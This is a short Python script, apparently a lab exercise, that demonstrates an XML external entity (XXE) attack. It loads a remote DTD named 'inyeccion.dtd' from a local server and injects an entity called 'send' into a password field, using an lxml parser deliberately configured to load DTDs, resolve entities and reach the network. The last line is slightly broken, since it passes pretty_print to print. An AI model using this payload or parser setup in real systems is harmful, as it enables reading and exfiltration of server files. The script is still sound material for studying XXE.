import lxml.etree as ET

datos = """
<!DOCTYPE datosSesion SYSTEM "http://127.0.0.1:8888/inyeccion.dtd">
<datosSesion>
	<username>Jose</username>
	<password>&send;</password>
</datosSesion>
"""
parser = ET.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)
arbol = ET.fromstring(datos, parser)
print(ET.tostring(arbol), pretty_print=True)